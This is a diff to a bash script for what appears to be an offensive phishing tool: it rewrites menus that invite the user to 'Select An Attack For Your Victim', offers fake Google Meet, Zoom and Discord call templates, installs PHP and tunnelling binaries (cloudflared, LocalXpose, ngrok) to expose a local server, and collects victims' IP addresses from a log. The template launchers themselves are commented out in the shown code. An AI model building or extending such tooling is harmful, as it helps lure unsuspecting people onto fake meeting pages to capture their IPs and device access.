@@ -92,10 +92,58 @@ banner() {
 EOF
 }
 
-## Install Dependencies
-dependencies() {
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+## Small Banner
+banner_small() {
+        cat <<- EOF
+                 ${BLUE}
+                 ${BLUE}░░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░█▀▀░█▀█░█▄█
+                 ${BLUE}░░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░█░░░█▀█░█░█
+                 ${BLUE}░░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀░▀
+                 ${BLUE}                       ${RED}Version ${__version__}
+        EOF
 }
+
+## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
+if [[ ! -d ".server" ]]; then
+        mkdir -p ".server"
+fi
+
+if [[ ! -d "auth" ]]; then
+        mkdir -p "auth"
+fi
+
+if [[ -d ".server/www" ]]; then
+        rm -rf ".server/www"
+        mkdir -p ".server/www"
+else
+        mkdir -p ".server/www"
+fi
+
+## Remove logfile
+if [[ -e ".server/.loclx" ]]; then
+        rm -rf ".server/.loclx"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+        rm -rf ".server/.cld.log"
+fi
+
+## Script termination
+exit_on_signal_SIGINT() {
+        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+        exit 0
+}
+
+exit_on_signal_SIGTERM() {
+        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+        exit 0
+}
+
+trap exit_on_signal_SIGINT SIGINT
+trap exit_on_signal_SIGTERM SIGTERM
+
 
 ## Kill already running process
 kill_pid() {
@@ -194,36 +242,119 @@ check_status() {
         [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e ""
 }
 
+## Dependencies
+dependencies() {
+        echo -e "\n${CYAN}Installing required packages..."
 
-stop() {
-if [[ "$windows_mode" == true ]]; then
-  # Windows-specific process termination
-  taskkill /F /IM "ngrok.exe" 2>/dev/null
-  taskkill /F /IM "php.exe" 2>/dev/null
-  taskkill /F /IM "cloudflared.exe" 2>/dev/null
-else
-  # Unix-like systems
-  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-  checkphp=$(ps aux | grep -o "php" | head -n1)
-  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)
+        if [[ -d "/data/data/com.termux/files/home" ]]; then
+                if [[ ! $(command -v proot) ]]; then
+                        echo -e "\n${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
+                        pkg install proot resolv-conf -y
+                fi
 
-  if [[ $checkngrok == *'ngrok'* ]]; then
-    pkill -f -2 ngrok > /dev/null 2>&1
-    killall -2 ngrok > /dev/null 2>&1
-  fi
+                if [[ ! $(command -v tput) ]]; then
+                        echo -e "\n${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+                        pkg install ncurses-utils -y
+                fi
+        fi
 
-  if [[ $checkphp == *'php'* ]]; then
-    killall -2 php > /dev/null 2>&1
-  fi
-
-  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
-    pkill -f -2 cloudflared > /dev/null 2>&1
-    killall -2 cloudflared > /dev/null 2>&1
-  fi
-fi
-
-exit 1
+        # Check for php, curl, unzip, and jq
+        if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v jq) ]]; then
+                echo -e "\n${GREEN} Packages already installed."
+        else
+                pkgs=(php curl unzip jq)  # Add jq to the list of packages
+                for pkg in "${pkgs[@]}"; do
+                        type -p "$pkg" &>/dev/null || {
+                                echo -e "\n${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
+                                if [[ $(command -v pkg) ]]; then
+                                        pkg install "$pkg" -y
+                                elif [[ $(command -v apt) ]]; then
+                                        sudo apt install "$pkg" -y
+                                elif [[ $(command -v apt-get) ]]; then
+                                        sudo apt-get install "$pkg" -y
+                                elif [[ $(command -v pacman) ]]; then
+                                        sudo pacman -S "$pkg" --noconfirm
+                                elif [[ $(command -v dnf) ]]; then
+                                        sudo dnf -y install "$pkg"
+                                elif [[ $(command -v yum) ]]; then
+                                        sudo yum -y install "$pkg"
+                                else
+                                        echo -e "\n${RED} Unsupported package manager, Install packages manually."
+                                        { reset_color; exit 1; }
+                                fi
+                        }
+                done
+        fi
 }
+
+
+# Download Binaries
+download() {
+        url="$1"
+        output="$2"
+        file=`basename $url`
+        if [[ -e "$file" || -e "$output" ]]; then
+                rm -rf "$file" "$output"
+        fi
+        curl --silent --insecure --fail --retry-connrefused \
+                --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+
+        if [[ -e "$file" ]]; then
+                if [[ ${file#*.} == "zip" ]]; then
+                        unzip -qq $file > /dev/null 2>&1
+                        mv -f $output .server/$output > /dev/null 2>&1
+                elif [[ ${file#*.} == "tgz" ]]; then
+                        tar -zxf $file > /dev/null 2>&1
+                        mv -f $output .server/$output > /dev/null 2>&1
+                else
+                        mv -f $file .server/$output > /dev/null 2>&1
+                fi
+                chmod +x .server/$output > /dev/null 2>&1
+                rm -rf "$file"
+        else
+                echo -e "\n${RED} Error occured while downloading ${output}."
+                { reset_color; exit 1; }
+        fi
+}
+
+## Install Cloudflared
+install_cloudflared() {
+        if [[ -e ".server/cloudflared" ]]; then
+                echo -e "\n${GREEN} Cloudflared already installed."
+        else
+                echo -e "\n${CYAN} Installing Cloudflared..."${WHITE}
+                arch=`uname -m`
+                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+                elif [[ "$arch" == *'aarch64'* ]]; then
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+                elif [[ "$arch" == *'x86_64'* ]]; then
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+                else
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+                fi
+        fi
+}
+
+## Install LocalXpose
+install_localxpose() {
+        if [[ -e ".server/loclx" ]]; then
+                echo -e "\n${GREEN} LocalXpose already installed."
+        else
+                echo -e "\n${CYAN} Installing LocalXpose..."${WHITE}
+                arch=`uname -m`
+                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+                elif [[ "$arch" == *'aarch64'* ]]; then
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+                elif [[ "$arch" == *'x86_64'* ]]; then
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+                else
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+                fi
+        fi
+}
+
 
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -673,77 +804,74 @@ about() {
         esac
 }
 
-rendercam() {
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
+## Tunnel selection
+tunnel_menu() {
+        { clear; banner_small; }
+        cat <<- EOF
+                ${CYAN} 0. Main Menu
+                ${CYAN} 1. Localhost
+                ${CYAN} 2. Ngrok.io
+                ${CYAN} 3. Cloudflared
+        EOF
 
-printf "\n-----Choose tunnel server----\n"
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-select_template
+        read -p "${MAGENTA} Select a port forwarding service or return to main menu:"
 
-if [[ $option_server -eq 2 ]]; then
-cloudflare_tunnel
-elif [[ $option_server -eq 3 ]]; then
-ngrok_server
-elif [[ $option_server -eq 1 ]]; then
-  localhost_server
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-rendercam
-fi
+        case $REPLY in 
+                0 | 00)
+                        echo -ne "\n${CYAN} Returning to main menu..."
+                        { sleep 1; main_menu; };;
+                1 | 01)
+                        start_localhost;;
+                2 | 02)
+                        start_ngrok;;
+                3 | 03)
+                        start_cloudflared;;
+                *)
+                        echo -ne "\n${RED} Invalid Option, Try Again..."
+                        { sleep 1; tunnel_menu; };;
+        esac
 }
 
-select_template() {
-    if [ "$option_server" -gt 3 ] || [ "$option_server" -lt 1 ]; then
-        printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
-        sleep 1
-        clear
-        banner
-        rendercam
-        return
-    fi
+## Main Menu
+main_menu() {
+        { clear; banner; echo; }
+        cat <<- EOF
+                 ${RED}Select An Attack For Your Victim:
 
-    printf "\n----- Choose a template -----\n"
-    printf "\n\e[1;92m[01]\e[0m\e[1;93m Google Meet\e[0m\n"
-    printf "\e[1;92m[02]\e[0m\e[1;93m Zoom\e[0m\n"
-    printf "\e[1;92m[03]\e[0m\e[1;93m Discord\e[0m\n"
-    printf "\e[1;92m[99]\e[0m\e[1;93m About\e[0m\n"
-    printf "\e[1;92m[00]\e[0m\e[1;93m Exit\e[0m\n"
+                 ${WHITE}| ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet
+                 ${WHITE}| ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call
+                 ${WHITE}| ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call
 
-    default_option_template=1
-    read -p $'\n\e[1;92m[+] Choose a template: [Default is 1] \e[0m' option_tem
-    option_tem="${option_tem:-$default_option_template}"
+                 ${WHITE}| ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About
+                 ${WHITE}| ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit
 
-    case "$option_tem" in
-        1)
-            printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
-            # start_google_meet
-            ;;
-        2)
-            printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
-            # start_zoom
-            ;;
-        3)
-            printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
-            # start_discord
-            ;;
-        99)
-            about;;
-        0 | 00 )
-            msg_exit;;
-        *)
-            echo -ne "\n${RED} Invalid Option, Try Again..."
-            { sleep 1; select_template; };;
-            ;;
-    esac
+        EOF
+
+        echo
+        read -p " ${BRIGHT_GREEN}Select an option: "
+
+        case $REPLY in 
+                1 | 01)
+                        printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
+                        # start_google_meet
+                        ;;
+                2 | 02)
+                        printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
+                        # start_zoom
+                        ;;
+                3 | 03)
+                        printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
+                        # start_discord
+                        ;;
+                99)
+                        about;;
+                0 | 00)
+                        msg_exit;;
+                *)
+                        echo -ne "\n${RED} Invalid Option, Try Again..."
+                        { sleep 1; main_menu; };;
+
+        esac
 }
 
 ## Main
@@ -751,4 +879,5 @@ kill_pid
 dependencies
 check_status
 banner
-rendercam
+main_menu
+
